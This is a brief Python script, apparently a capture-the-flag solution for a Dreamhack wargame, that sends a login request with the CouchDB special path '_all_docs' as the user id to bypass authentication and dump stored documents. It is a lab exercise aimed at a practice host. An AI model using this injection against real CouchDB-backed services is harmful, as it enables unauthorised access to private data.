import requests

URL = "http://host1.dreamhack.games:15093"
AUTH_URI = "/auth"
PAYLOAD = '_all_docs'
DATA = {'uid': PAYLOAD}

resp = requests.post(URL + AUTH_URI, json=DATA)
print(resp.text)